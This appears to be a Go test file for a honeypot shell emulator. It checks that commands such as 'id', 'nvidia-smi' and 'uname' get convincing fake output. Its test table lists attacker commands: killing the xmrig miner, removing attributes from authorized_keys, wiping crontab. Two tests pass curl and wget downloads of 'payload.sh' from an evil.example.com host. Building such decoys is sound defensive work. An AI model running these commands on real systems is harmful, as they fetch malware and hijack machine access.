package session

import (
	"strings"
	"testing"
)

// table-driven checks: command -> substring expected in output
var cmdOutputCases = []struct {
	cmd     string
	want    string
	wantExit uint32
}{
	{"id", "uid=0(root)", 0},
	{"uname -a", "Linux", 0},
	{"uname -r", "6.8.0", 0},
	{"uname -m", "x86_64", 0},
	{"hostname", "ubuntu", 0},
	{"hostname -i", "10.0.0.42", 0},
	{"ls -la", ".bashrc", 0},
	{"ls -a", ".bash_history", 0},
	{"ls /", "etc", 0},
	{"ifconfig", "eth0", 0},
	{"ip addr", "10.0.0.42", 0},
	{"ip route", "default via", 0},
	{"netstat", "LISTEN", 0},
	{"ps aux", "sshd", 0},
	{"df -h", "Filesystem", 0},
	{"free -m", "Mem:", 0},
	{"cat /proc/cpuinfo", "processor", 0},
	{"cat /proc/meminfo", "MemTotal", 0},
	{"cat /etc/hostname", "ubuntu", 0},
	{"cat /etc/os-release", "Ubuntu", 0},
	{"which bash", "/usr/bin/bash", 0},
	{"which curl", "/usr/bin/curl", 0},
	{"which nvidia-smi", "/usr/bin/nvidia-smi", 0},
	{"which awk", "/usr/bin/awk", 0},
	{"echo hello world", "hello world", 0},
	{"crontab -l", "no crontab", 1},
	{"crontab -r", "", 0},
	{"nvidia-smi", "Tesla T4", 0},
	{"nvidia-smi -q", "Product Name", 0},
	{"nvidia-smi -L", "Tesla T4", 0},
	{"killall xmrig", "", 0},
	{"chattr -iae /root/.ssh/authorized_keys", "", 0},
	{"disown", "", 0},
	{"chpasswd", "", 0},
	{"grep foo", "", 1},
	{"wc -l", "0", 0},
	{"head -c 1", "", 0},
}

func TestCmdOutputTable(t *testing.T) {
	for _, c := range cmdOutputCases {
		t.Run(c.cmd, func(t *testing.T) {
			out, exit := dispatch(c.cmd)
			if exit != c.wantExit {
				t.Errorf("exit: want %d got %d", c.wantExit, exit)
			}
			if !strings.Contains(out, c.want) {
				t.Errorf("want %q in output, got: %q", c.want, out)
			}
		})
	}
}

func TestWgetNoURL(t *testing.T) {
	out, exit := dispatch("wget")
	if exit == 0 {
		t.Error("want non-zero exit for wget with no url")
	}
	if !strings.Contains(out, "missing URL") {
		t.Errorf("want 'missing URL' in output, got %q", out)
	}
}

func TestWgetWithURL(t *testing.T) {
	out, exit := dispatch("wget http://evil.example.com/payload.sh")
	if exit == 0 {
		t.Error("want non-zero exit, wget should fail")
	}
	// should echo the url back -- useful for log analysis
	if !strings.Contains(out, "evil.example.com") {
		t.Errorf("want url in output, got %q", out)
	}
}

func TestCurlNoURL(t *testing.T) {
	out, exit := dispatch("curl")
	if exit == 0 {
		t.Error("want non-zero exit for curl with no url")
	}
	_ = out
}

func TestCurlWithURL(t *testing.T) {
	out, exit := dispatch("curl http://evil.example.com/payload.sh")
	if exit == 0 {
		t.Error("want non-zero exit, curl should fail")
	}
	if !strings.Contains(out, "evil.example.com") {
		t.Errorf("want url in output, got %q", out)
	}
}

func TestPingWithTarget(t *testing.T) {
	out, exit := dispatch("ping 1.2.3.4")
	if exit != 0 {
		t.Errorf("want exit 0, got %d", exit)
	}
	if !strings.Contains(out, "1.2.3.4") {
		t.Errorf("want target ip in output, got %q", out)
	}
}

func TestIPUnknownObject(t *testing.T) {
	_, exit := dispatch("ip bogus")
	if exit == 0 {
		t.Error("want non-zero exit for unknown ip object")
	}
}

func TestSudoPassthrough(t *testing.T) {
	out, exit := dispatch("sudo id")
	if exit != 0 {
		t.Errorf("sudo id: want exit 0, got %d", exit)
	}
	if !strings.Contains(out, "uid=0") {
		t.Errorf("sudo id: want uid=0 in output, got %q", out)
	}
}

func TestCatMissingFile(t *testing.T) {
	out, exit := dispatch("cat /no/such/file")
	if exit == 0 {
		t.Error("want non-zero exit for missing file")
	}
	if !strings.Contains(out, "No such file") {
		t.Errorf("want 'No such file' in output, got %q", out)
	}
}
